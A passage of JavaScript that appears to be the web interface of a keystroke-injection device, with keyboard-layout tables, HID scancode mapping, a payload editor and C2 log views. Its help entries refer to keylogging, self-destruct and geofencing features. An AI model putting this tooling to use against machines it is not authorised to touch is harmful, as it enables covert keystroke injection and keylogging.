			"IS": ['abcdefghijklmnopqrstuvwxyz1234567890-\'+,.<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&/()=_?*\';:>', '               @               {[]}\\  ~` ^   |'],
			"IT": ['abcdefghijklmnopqrstuvwxyz1234567890\'+\\,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"$%&/()=?^*|;:_>', '                                      [] @#    ', '                                      {}        '],
			"IT_142": ['abcdefghijklmnopqrstuvwxyz1234567890\'+\\,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"$%&/()=?^*|;:_>', '               @           #  {[]}   ~`      '],
			"JP": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./\\', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>?|', '', ''],
			"JP_101": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', ' ', ' '],
			"JP_102": ['abcdefghijklmnopqrstuvwxyz1234567890-^[]\\;:@,./\\', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'() =~{}|+*`<>?_', '', ''],
			"JP_106": ['abcdefghijklmnopqrstuvwxyz1234567890-^@[];: ,./\\', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'() =~`{}+* <>?_', ' ', ' '],
			"JP_AX2": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./\\', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>?|', '', ''],
			"JV": ['   []\\ ', '     ()  | ? ', '                   12345678  -=     `    ', '                    !@#$%^&*90_+   ~  / '],
			"KA": ['!?%:.;,/=( ', '1234567890-+) ', '                                          '],
			"KA_E": ['!,;%:?.()-/\\', '                          1234567890+=    \'   /', '                 !@#$^&*()=[]\\ ` ', '  CD    I  LM        V X        _ {}| "~<>  '],
			"KA_MES": ['1234567890-=,./', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@$%^&*()_+[]/:"\\;:??', '                \'~#   |   `<>'],
			"KA_O": ['!,;%:?.()-/\\', '1234567890+=\'/', '                 !@#$^&*()=[]\\ ` ', '                              _ {}| "~ >  '],
			"KA_Q": ['1234567890-=[]~;\',./\\', '          N       !@#$%^&*()_+{}|:"<>? ', '                          '],
			"KH": ['-=\\   ', '    !_+ / ,.? ', '                               /:<> ', '%&    )(*$ @ #1234567890{}[]; '],
			"KK": ['",.\\(\\', '!;:/)?|'],
			"KM": ['  ', '  !"%()=  ? ', '                      @$*{}\\ ,./ '],
			"KN": ['1234567890-  ,. ', '           () |  ', '                                   ', '                                           '],
			"KO": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? '],
			"KO_103": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? '],
			"KU": ['-=][\\\'`./ ', ' ` !@#$^&*)(_+}{|:"~>< '],
			"KY": ['1234567890-=\\. ', '!";%:?*()_+/, ', '                                             ', '                                             '],
			"LA": ['abcdefghijklmnopqrstuvwxyz1234567890\'+}{|,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&/()=?*][;:_>', '                @                   \\  ~` ^   '],
			"LISU": ['=[]\\`? ', '@$&( ) !*^Q  #% > <1234567890_+{}|"~,./ '],
			"LISU_B": ['Q1234567890[]\\`,./ ', '       !@#$%^&*()_+{}|"~<>? '],
			"LK411_AJ": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', '` ', '~ '],
			"LK411_JJ": ['abcdefghijklmnopqrstuvwxyz1234567890-^@[];: ,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'() =~`{}+* <>?_', ' ', ' '],
			"LO": ['/" ', '  .*,:!?  _;+ x0( 123456789 - \\%=\'$) ', '                                      '],
			"LT": ['abcdefghijklmnopqrstuvwxyz90-[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ()_{}|:"~<>? ', '                         1234567890 =          ', '                          !@#$%^&*   +          '],
			"LT_S": ['abcdeghijklmnoprstuvyz!-/;:,.=()?xwq`f<', 'ABCDEGHIJKLMNOPRSTUVYZ1234567890+XWQ~F>', '                         @_#$^&*[]\'%{}| "\\'],
			"LT_T": ['abcdefghijklmnoprstuvyz!"/;:,.?()_+|` ', 'ABCDEFGHIJKLMNOPRSTUVYZ1234567890-=\\~ ', '                               {[]}            '],
			"LV": ['psjildzateorumnkgbv1234567890-fhc ,.', 'PSJILDZATEORUMNKGBV!$%/&()_FHC?;:', '              q w xy   " :  =[]   <> \\', '               Q W XY  @#$~^   ;{}      |'],
			"LV_Q": ['abcdefghijklmnopqrstuvwxyz1234567890-=[];\'`,./\\', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>?|', '                         ', '                                '],
			"LV_S": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', '                          ', '                                '],
			"MAORI": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? '],
			"MK": ['1234567890-=`,./', '!%&*()_+~;:?', ' {  []     }       @                     '],
			"MK_S": ['1234567890-=,./', '!\'%*()-+;:?', '                          @#$ ^&{}[]|   <>\\'],
			"ML": ['1234567890-  ,. ', '  ()    ', '                                          '],
			"MM": ['-=\',./', '*()_+"?', 'abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./\\', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>?|'],
			"MN": ['-":._,%?\\= ', '1234567890|+ '],
			"MN_S": ['1234567890 =;. ', '                 !%  ()+|~? '],
			"MN_T": ['1234567890 =[]  ', '                   %  ()+ ~  '],
			"MR": [' - ,.', '         () ', '                         1234567890-=[]\\;\'`,./', '                         !@#$%^&*()_+{}|:"~<>? '],
			"MT_47": ['abcdefghijklmnopqrstuvwxyz1234567890-=;\',./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@$%^&*()_+:"<>? ', '                                []\\  `    ', '                                 {}|  ~    '],
			"MT_48": ['abcdefghijklmnopqrstuvwxyz1234567890-=#;\',./', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"$%^&*()_+~:@<>?', '                                []   `   \\', '                                 {}      |'],
			"NE": ['  (. , ', '                   )   ?   ', '                       !@#$%^&*\'"-=         ', '                        1234567890 +         '],
			"NKO": ['-=\\ ', '[ ]  /      %  *()_+|:" . '],
			"NL": ['abcdefghijklmnopqrstuvwxyz1234567890/*<+@,.-]', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&_()\'?~^|>`;:=[', '                    {} \\       '],
			"NO": ['abcdefghijklmnopqrstuvwxyz1234567890+\\\'|,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#%&/()=?`^*;:_>', '                         @$ {[]}  ~       '],
			"NO_S": ['abcdefghijklmnopqrstuvwxyz1234567890+\\\'|,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#%&/()=?`^*;:_>', '          @$ {[]}  ~     ', '                             '],
			"NO_SE": ['abcdefghijklmnoprstuvz1234567890+\\|,.-', 'ABCDEFGHIJKLMNOPRSTUVZ!"#%&/()=?`;:_', '        q     wxy @$ {[]} ~\' <> ', '          Q     WXY            ^*    '],
			"NSO": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', '           ', '                       '],
			"NTL": ['*+[] / ', '-={}|  ', '                            '],
			"OGHAM": ['                    ', '                                               '],
			"OLCHIKI": ['        ,. ', '                                    '],
			"OR": ['1234567890-  ,. ', '          ()   ', '                               ', '                                           '],
			"PA": [' 1234567890-   ,. ', '         ()       ', '                            ', '                                               '],
			"PHAGS": ['1234567890 = ', '           !% & () +fe00? ', '                                      ', '                                             '],
			"PL": ['abcdefghijklmnopqrstuvwxzy1234567890+\',.- ', 'ABCDEFGHIJKLMNOPQRSTUVWXZY!"#%&/()=?*;:_ ', ' {         }  \\  @   ~^` $ <>  '],
			"PL_P": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', '                                      ', '                                       '],
			"PS": ['-=\\ / ', ' !)(+][*:. ', '   ><\'"    ;?~@#$%^&_}{|`, '],
			"PT": ['abcdefghijklmnopqrstuvwxyz1234567890\'+~\\,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&/()=?*`^|;:_>', '                          @ {[]}  ]       '],
			"RO": ['abcdefghijklmnopqrstuvwxzy1234567890+\'],.- ', 'ABCDEFGHIJKLMNOPQRSTUVWXZY!"#%&/()=?*[;:_ ', ' {       }  \\   @|   ~^` $ <>  '],
			"RO_P": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', '               ~^`      ', '                                       '],
			"RO_S": ['abcdefghijklmnopqrstuvwxyz1234567890-=,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+;:? ', '                    ~^`[]\\;\'`<>  ', '                                  {}|:"~  '],
			"RU": ['1234567890-=\\. ', '!";%:?*()_+|, '],
			"RU_M": ['1234567890-=[]\\;,./ ', '!";%:?*()_+{}/:<>? ', '                                             '],
			"RU_SAKHA": ['!  ;:-=\\". ', '?  ()_+/, ', '                                               '],
			"RU_T": ['-/":,._?%!;)|)', '1234567890=\\(+(', '                                              '],
			"SB": ['abcdefghijklmnopqrstuvwxzy1234567890+#^,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXZY!"$%&/()=?`*\';:_>', '              @             {[]}\\  ~       |'],
			"SB_E": ['abcdefghijklmnopqrstuvwxzy1234567890+^,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXZY!"$%&/()=?`*;:_>', '               @         {[]}\\  ~#     |'],
			"SB_L": ['abcdefghijklmnopqrstuvwxzy1234567890+^,.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXZY!"$%&/()=?`*;:_>', '              @         {[]}\\  ~#      |'],
			"SI": ['\'1234567890-=; . / ', '  "!@$$%^&*()_+: , ? ', '                        '],
			"SK": ['abcdefghijklmnopqrstuvwxzy+=;,.-&', 'ABCDEFGHIJKLMNOPQRSTUVWXZY1234567890%/()"!?:_*', ' {&[]    } \'\\   @|# >~^`$ <>*<'],
			"SK_Q": ['abcdefghijklmnopqrstuvwxyz+=;,.-&', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890%/()"!?:_*', ' {&[]    } \'\\   @|# >~^`$ <>*<'],
			"SORA": [' -=[]\\;\'`,./ ', '                          !@#$%^&*()_+{}|:"~<>? ', '                                               '],
			"SQ": ['abcdefghijklmnopqrstuvwxzy1234567890-=@][\\,./<', 'ABCDEFGHIJKLMNOPQRSTUVWXZY!"#$%^&*()_+\'}{|;:?>', ' {  []   }  \\   @|   ~^`$ <> '],
			"SR_C": ['1234567890\'+`,.- ', '!"#$%&/()=?*~;:_ ', '                                           <>  '],
			"SR_L": ['abcdefghijklmnopqrstuvwxzy1234567890\'+,.- ', 'ABCDEFGHIJKLMNOPQRSTUVWXZY!"#$%&/()=?*~;:_ ', ' {  []   }  \\    @|   ~^`  <>  '],
			"SV_FI": ['abcdefghijklmnoprstuvz1234567890+,.-', 'ABCDEFGHIJKLMNOPRSTUVZ!"#%&/()=?`;:_', '        q     wxy @$ {[]}\\ ~\'|<> ', '          Q     WXY            ^*    '],
			"SV_SE": ['abcdefghijklmnopqrstuvwxyz1234567890+\',.-<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#%&/()=?`^*;:_>', '                         @$ {[]}\\  ~       |'],
			"TA": [' 1234567890-  ,. ', '                ', '                                    '],
			"TA_99": ['1234567890-=\\`,. ', ' ":/[]  !@#$%^&*()_+{}|;\'~<>? '],
			"TAILE": ['   ', '                          *+[] / ', '                                    -={}   '],
			"TE": ['1234567890-  ,. ', '         ()    ', '                               ', '                                              '],
			"TFNG_B": [',& "\'(- _  )=$* ;:!<', '          ?         1234567890+  % ./>', '                           ~#{[| \\^@]}        '],
			"TFNG_E": [',&"\'(-_ )=$*;:!<', '  ?1234567890+% ./>', '                          ~#{[| \\^@]}        '],
			"TG": ['1234567890\\. ', '!";%:?*()/, '],
			"TH_K": ['/-_', '?")(+,.%', '                                      %+      '],
			"TH_KN": ['/-_', '?")(+,.%'],
			"TH_P": ['= _ ', '+"/,?_.()-%', '                                               '],
			"TH_PN": ['= _ ', '+"/,?_.()-%'],
			"TK": ['abdefghijklmnoprstuwyz1234567890-=;\',./ ', 'ABDEFGHIJKLMNOPRSTUWYZ!@#$%&*()_+:"<>? ', '                                        |     \\ '],
			"TR_F": ['uveatnkmlszhpfiorcgdj1234567890/-qwxy+b.,<', 'UVEATNKMLSZHPFIORCGDJ!"^$%&\'()=?_QWXY*B:;>', '        @    #{[]}\\|~`  |', '                 > <                 '],
			"TR_Q": ['abcdefghjklmnopqrstuvwxyz1234567890*-,i".<', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!\'^+%&/()=?_;:>', '      i       @       >#$ {[]}\\|~` <   |', '                                              '],
			"TT": ['1234567890-=\\.', '!";%:?*()_+/,', '                        @#$  []{}    \'<> ', '                                          '],
			"TT_102": ['1234567890-=\\.\\', '!";%:?*()_+/,/', '                        @#$  []{}    \'<> ', '                                         '],
			"TZM": ['qbcdefghijkl,noparstuvzxyw&"\'(-_)=^$*m;:!<', 'QBCDEFGHIJKL?NOPARSTUVZXYW1234567890+M% ./>', '                          ~#{[|`\\^@]}        '],
			"UG": ['1234567890-=][\\\'`. ', '                    !@#$%^&*)(_+|:"~>< '],
			"UG_L": ['1234567890-=][\\\'`. ', '                    !@#$%^&*)(_+|:"~>< '],
			"UK": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]#;\'`,./\\', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"$%^&*()_+{}~:@<>?|', '                                        ', '                                           '],
			"UK_E": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]#;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!"$%^&*()_+{}~:@<>? ', '                     ^       |~     ', '                                \\ `     '],
			"UKR": ['1234567890-=\\.', '!";%:?*()_+/,', '                                               ', '                                               '],
			"UKR_E": ['1234567890-=\\\'.', '!";%:?*()_+/,', '                                               ', '                                               '],
			"UR": ['1234567890-=][\\\'`/ ', '    !@#$^)(_+}{|:"~>< ', '                                     '],
			"US": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? '],
			"US_M": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', '            ', '        $                 '],
			"UZ": ['1234567890\\. ', '!";%:?*()/, '],
			"VI": ['abcdefghijklmnopqrstuvwxyz-\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ_+|:"~<>? ', 'abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? '],
			"WOLOF": ['qbcdefghijkl,noparstuvzxyw&"\'(-_)=^*m;:!<', 'QBCDEFGHIJKL?NOPARSTUVZXYW1234567890+M./>', '                          ~#{[|`\\^@]}        '],
			"YO": ['abcdefghijklmnopqrstuvwxyz1234567890-=[]\\;\'`,./ ', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"~<>? ', '                                          '],
		};

		const positionalIds = ["04", "05", "06", "07", "08", "09", "0a", "0b", "0c", "0d", "0e", "0f", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "1a", "1b", "1c", "1d", "1e", "1f", "20", "21", "22", "23", "24", "25", "26", "27", "2d", "2e", "2f", "30", "31", "33", "34", "35", "36", "37", "38", "64"];

		function generateKeymapViewerMenu() {
			rows = [
				['29', '3a', '3b', '3c', '3d', '3e', '3f', '40', '41', '42', '43', '44', '45'],
				['35', '1e', '1f', '20', '21', '22', '23', '24', '25', '26', '27', '2d', '2e', '2a'],
				['2b', '14', '1a', '08', '15', '17', '1c', '18', '0c', '12', '13', '2f', '30', '31'],
				['39', '04', '16', '07', '09', '0a', '0b', '0d', '0e', '0f', '33', '34', '28'],
				['e1', '1d', '1b', '06', '19', '05', '11', '10', '36', '37', '38', 'e5'],
				['e0', 'e2', 'e3', '2c', 'e7', 'e6', 'e4']
			];
			rows.forEach((row, i) => {
				row.forEach((keyName) => {
					divName = document.createElement('div');
					divName.id = `keymap_${keyName}`;
					divName.classList.add("key");
					document.getElementById(`keymap_row${i + 1}`).appendChild(divName);
					keymapViewerKeys.push(keyName);
				})
			});
		}

		const buildModifierTextCache = {};

		function buildModifierText(modifier) {
			if (buildModifierTextCache[modifier]) {
				return buildModifierTextCache[modifier];
			}
			let modifierText = "";
			for (const scancode in modifiersInverted) {
				if (modifier & modifiersInverted[scancode]) {
					modifierText += modifiersInverted[scancode] + "+";
				}
			}
			buildModifierTextCache[modifier] = modifierText.slice(0, -1);
			return buildModifierTextCache[modifier];
		}

		const getKeyFromHIDCache = {};

		function getKeyFromHID(hid, useShiftedKey) {
			const cacheKey = `${hid}_${useShiftedKey}`;
			if (getKeyFromHIDCache[cacheKey]) {
				return getKeyFromHIDCache[cacheKey];
			}
			if (hid == "00") {
				hid = "0";
			}
			const key = useShiftedKey ? keymapData[hid][1] : keymapData[hid][0];
			getKeyFromHIDCache[cacheKey] = key === "SPACE" ? " " : key;
			return getKeyFromHIDCache[cacheKey];
		}

		function sortedKeymapGlobalArray() {
			const keymapGlobalMap = new Map();
			keymapGlobal.forEach(([key, value]) => {
				key = key.toString(16);
				if (keymapGlobalMap.has(key)) {
					keymapGlobalMap.get(key).push(value);
				} else {
					keymapGlobalMap.set(key, [value]);
				}
			});
			return new Map([...keymapGlobalMap.entries()].sort());
		}

		function generateKeymapList() {
			const keymapListElement = document.getElementById("keymap-list");
			keymapListElement.innerHTML = "";
			keymapList = [];

			for (let variableName in locale) {
				keymapList.push(variableName);
				const name = document.createElement("option");
				name.value = variableName;
				name.text = variableName;
				keymapListElement.appendChild(name);
			}

			keymapListPretty = keymapList.toString().split(',').join(', ');
		}

		function updateKeymapViewer(keymap, keymapViewer) {
			keymapViewer.forEach((key, i) => {
				const output = document.getElementById(`keymap_${key}`);
				const currentKeys = keymap[key].map((value, index) => {
					return value;
				});
				output.innerHTML = currentKeys.map(value => `<div>${value}</div>`).join('');
			});
			let keymapFindListDiv = document.getElementById('keymapFindList');
			keymapFindListDiv.innerHTML = "";
		}

		function generateKeymap(localeName) {
			keymapLocal = processKeymapLocal(getLocale(localeName));
			unpacked = unpackKeymap(keymapLocal);
			keymapData = Object.assign({}, generateFullKeymapGlobal(), unpacked);
			keymapInverted = generateInvertedKeymap(keymapData);
			updateKeymapViewer(keymapData, keymapViewerKeys);
			memoizedKeyToHidMapping.invalidateCache();
			memoizedHidToKeyMapping.invalidateCache();
		}

		function generateFullKeymapGlobal() {
			return keymapGlobal.reduce((acc, [key, value]) => {
				acc[key.toString(16)] = [value];
				return acc;
			}, {});
		}

		function getLocale(localeName) {
			if (localeName) {
				logMessage("CRIT", `Locale Set to ${localeName}`);
				return localeName.toString().toUpperCase();
			} else {
				logMessage("CRIT", `Locale Set to Default: ${locale["US"].toString()}`);
				return "US";
			}
		}

		function processKeymapLocal(keymapLocal) {
			keymapData = locale[keymapLocal];
			if (!Array.isArray(keymapData)) {
				for (let i = 0; i < 4; i++) {
					if (keymapData[i]) {
						keymapData[i] = keymapData[i].split("");
					}
				}
			}
			return keymapData;
		}

		function unpackKeymap(keymapLocal) {
			const unpacked = {};
			positionalIds.forEach((currentUsage, i) => {
				unpacked[currentUsage] = keymapLocal.map((layer) => (layer[i] === " " ? "" : layer[i]));
			});
			return unpacked;
		}

		const memoizedKeyToHidMapping = (() => {
			let cache = {};
			const memoizedFunction = (key) => {
				if (cache[key]) {
					return cache[key];
				}
				const result = keyToHidMapping(key);
				if (result === undefined || result === null) {
					console.log("No matching value for key: ", key);
					return;
				}
				cache[key] = result;
				return result;
			};

			memoizedFunction.invalidateCache = () => {
				cache = {};
			};

			return memoizedFunction;
		})();

		function keyToHidMapping(key) {
			if (key === " " || key === " ") {
				key = "SPACE";
			}
			if (key === "DOWN" || key === "DOWNARROW" || key === "DOWN_ARROW") {
				key = "DOWNARROW";
			}
			if (key === "UP" || key === "UPARROW" || key === "UP_ARROW") {
				key = "UPARROW";
			}
			if (key === "LEFT" || key === "LEFTARROW" || key === "LEFT_ARROW") {
				key = "LEFTARROW";
			}
			if (key === "RIGHT" || key === "RIGHTARROW" || key === "RIGHT_ARROW") {
				key = "RIGHTARROW";
			}
			const mappedKey = keymapInverted[key];
			if (key === "102nd" || key === "102ND") {
				return ["0", "64"];
			} else if (mappedKey) {
				logMessage("DEBUG", `KeyToHidMapping: (${typeof key}:${key}:${mappedKey})`);
				return mappedKey;
			} else {
				logMessage("INFO", `No keyToHidMapping for (${typeof key}:${key}), check DUCKY_LANG mapping`);
				logMessage("INFO", `? PAYLOAD HALTED, ERRORS DETECTED`);
			}
		}

		const hidToKey = (keycode) => (keycode in keymapData ? keymap[keycode] : keycode);

		const memoizedHidToKeyMapping = (() => {
			let cache = {};

			const memoizedFunction = (key) => {
				if (cache[key]) {
					return cache[key];
				}
				const result = hidToKeyMapping(key);
				if (result === undefined || result === null) {
					console.log("No matching value for key: ", key);
					return;
				}
				cache[key] = result;
				return result;
			};

			memoizedFunction.invalidateCache = () => {
				cache = {};
			};

			return memoizedFunction;
		})();

		function hidToKeyMapping(key) {
			const mappedKey = keymapData[key];
			const logType = mappedKey ? "DEBUG" : "INFO";
			const message = mappedKey ?
				`HidToKeyMapping: (${typeof key}:${key}:${mappedKey})` :
				`No hidToKeyMapping for (${typeof key}:${key}), check DUCKY_LANG mapping`;

			logMessage(logType, message);

			if (!mappedKey) {
				logMessage("INFO", "? PAYLOAD HALTED, ERRORS DETECTED");
			}

			return mappedKey;
		}

		function generateInvertedKeymap(keymap) {
			return Object.entries(keymap).reduce((inverted, [id, values]) => {
				values.forEach((value, i) => {
					const modifier = [0x00, 0x02, 0x40, 0x42][i].toString(16);
					inverted[value] = [modifier, id];
				});
				return inverted;
			}, {});
		}

		function findMatchingLocale(positionId, layer, character) {
			let positionIdIndex = positionalIds.indexOf(positionId);

			if (positionIdIndex === -1) {
				return new Set();
			}

			layer = parseInt(layer);
			let matchingLocales = new Set();

			for (let localeName in locale) {
				let keymap = locale[localeName];
				if (layer === 0) {
					for (let layers of keymap) {
						if (layers[positionIdIndex] === character) {
							matchingLocales.add(localeName);
							break;
						}
					}
				} else if (layer <= keymap.length) {
					if (keymap[layer - 1][positionIdIndex] === character) {
						matchingLocales.add(localeName);
					}
				}
			}

			return matchingLocales;
		}

		function findSharedLocales(...args) {
			if (args.length % 3 !== 0) {
				return [];
			}

			let comparisons = [];
			for (let i = 0; i < args.length; i += 3) {
				comparisons.push([args[i], args[i + 1], args[i + 2]]);
			}

			let sharedLocales = findMatchingLocale(...comparisons[0]);
			comparisons.slice(1).forEach(comp => {
				let matchingLocales = findMatchingLocale(...comp);
				sharedLocales = new Set([...sharedLocales].filter(x => matchingLocales.has(x)));
			});

			let localesString = Array.from(sharedLocales).join(', ');

			let keymapFindListDiv = document.getElementById('keymapFindList');
			keymapFindListDiv.innerHTML = localesString;

			return Array.from(sharedLocales);
		}

		function findKeymap() {
			let keys = document.querySelectorAll('.key > div:not([id]):not([class])');
			keys.forEach(function(key) {
				let id = key.parentElement.id.split('_')[1];
				if (positionalIds.includes(id)) {
					key.innerHTML = '';
				}
			});

			let keyElements = document.querySelectorAll('.key');
			let pressedKeys = [];
			let activeElement = null;

			keyElements.forEach(function(keyElement) {
				let id = keyElement.id.split('_')[1];
				if (!positionalIds.includes(id)) {
					return;
				}

				keyElement.addEventListener('click', function() {
					if (activeElement) {
						activeElement.style.backgroundColor = '';
						window.removeEventListener('keypress', activeElement.keypressHandler);
					}

					this.style.backgroundColor = 'red';
					activeElement = this;

					this.keypressHandler = function(e) {
						if (e.key === 'Backspace' || e.key === 'Delete') {
							pressedKeys = pressedKeys.filter((key) => key[0] !== id);
							activeElement.querySelector('div:not([id]):not([class])').textContent = '';
						} else {
							let keyValue = e.key;

							activeElement.querySelector('div:not([id]):not([class])').textContent = keyValue;
							activeElement.style.backgroundColor = '';
							pressedKeys = pressedKeys.filter((key) => key[0] !== id);
							pressedKeys.push([id, 0, keyValue]);
							findSharedLocales(...pressedKeys.flat());
						}
					};

					window.addEventListener('keypress', activeElement.keypressHandler);
				});
			});
		}

		const searchInput = document.getElementById('search');

		const entries = Array.from(document.querySelectorAll('#helppayloadExample, #helppayload, #helpkeylog, #helpselfDestruct, #helppayloadGeofencing, #helppayloadUSBIDs, #helpglobalKeys'));

		document.getElementById('search').addEventListener('keyup', function() {
			var input, filter, div, i, txtValue;
			input = document.getElementById('search');
			filter = input.value.toUpperCase();
			div = document.querySelectorAll('.helpEntry');

			var divsToToggle = document.querySelectorAll('#helppayloadExample, #helppayload, #helpkeylog, #helpselfDestruct, #helppayloadGeofencing, #helppayloadUSBIDs, #helpglobalKeys');

			if (input.value === '') {
				divsToToggle.forEach((div) => div.classList.add('hidden'));
			} else {
				divsToToggle.forEach((div) => div.classList.remove('hidden'));
			}

			for (i = 0; i < div.length; i++) {
				txtValue = div[i].textContent || div[i].innerText;
				if (txtValue.toUpperCase().indexOf(filter) > -1) {
					div[i].style.display = "";
				} else {
					div[i].style.display = "none";
				}
			}
		});

		var tooltipTimeout;

		function checkInput(input, field) {
			var pattern = new RegExp(input.pattern);
			var tooltipText = document.getElementById(field);

			clearTimeout(tooltipTimeout);

			if (!pattern.test(input.value)) {
				input.classList.add('glowing-effect');
				tooltipText.textContent = input.title;
				tooltipText.style.visibility = 'visible';
				tooltipTimeout = setTimeout(() => {
					tooltipText.style.visibility = 'hidden';
				}, 30000);
			} else {
				input.classList.remove('glowing-effect');
				tooltipText.textContent = '';
				tooltipText.style.visibility = 'hidden';
			}
		}

		function checkInputList(input, field, dataListId) {
			var dataList = document.getElementById(dataListId);
			var tooltipText = document.getElementById(field);

			clearTimeout(tooltipTimeout);
			var options = Array.from(dataList.options).map(opt => opt.value);

			if (!options.includes(input.value)) {
				input.classList.add('glowing-effect');
				tooltipText.textContent = input.title;
				tooltipText.style.visibility = 'visible';
				tooltipTimeout = setTimeout(() => {
					tooltipText.style.visibility = 'hidden';
				}, 30000);
			} else {
				input.classList.remove('glowing-effect');
				tooltipText.textContent = '';
				tooltipText.style.visibility = 'hidden';
			}
		}

		function applyEffect(element) {
			element.classList.add('apply-effect');
			setTimeout(function() {
				element.classList.remove('apply-effect');
			}, 1000);
		}

		if (hostname == "localhost") {
			hostname = "192.168.1.151";
		}

		const editor = document.getElementById('payload');
		const lineNumbers = document.getElementById('lineNumbers');

		editor.addEventListener('input', updateLineNumbers);
		editor.addEventListener('scroll', syncScroll);

		function updateLineNumbers() {
			const lines = editor.value.split('\n');
			lineNumbers.innerHTML = '';
			lines.forEach((line, index) => {
				const lineNumber = document.createElement('div');
				lineNumber.textContent = index + 1;
				lineNumbers.appendChild(lineNumber);
			});
		}

		function syncScroll() {
			lineNumbers.scrollTop = editor.scrollTop;
		}

		function setEditorLineColors(lineNumber, color) {
			const lines = lineNumbers.childNodes;
			if (lineNumber > 0 && lineNumber <= lines.length) {
				const lineElement = lines[lineNumber - 1];
				// remove any class starting with 'line-'
				lineElement.className = lineElement.className
					.split(' ')
					.filter(c => !c.startsWith('line-'))
					.join(' ');
				// add new color class if color is not 'none'
				if (color !== 'none') {
					lineElement.classList.add(`line-${color}`);
				}
			}
		}

		updateLineNumbers();





		// ConnectMode
		function downloadFrontendlog() {
			downloadFile('debuglog', 'frontend-log', true);
			downloadFile('c2log', 'c2-log', true);
		}

		console.log(hostname);

		viewDialog('loadingScreen', 'close');
		toggleClass('navbar-wifiIcon', 'visible', 'hidden');
		toggleClass('wifiDetails', 'visible', 'hidden');
		toggleClass('wifiRTT', 'visible', 'hidden');
		toggleClass('wifiRSSi', 'visible', 'hidden');
		toggleClass('deviceRefreshRate', 'hidden', 'visible');
		toggleClass('contentSubNav_c2log', 'hidden', 'visible');
		toggleClass('contentSubNav_payload', 'hidden', 'visible');
		toggleClass('sidebarNav_queue', 'hidden', 'visible');

		const deviceSelectDiv = document.getElementById("deviceSelect");
		if (!deviceSelectDiv.querySelector("#alias")) {
			const selectElement = document.createElement("select");
			selectElement.id = "alias";
			selectElement.name = "alias";
			deviceSelectDiv.appendChild(selectElement);
		}

		async function addCmd(alias, data) {
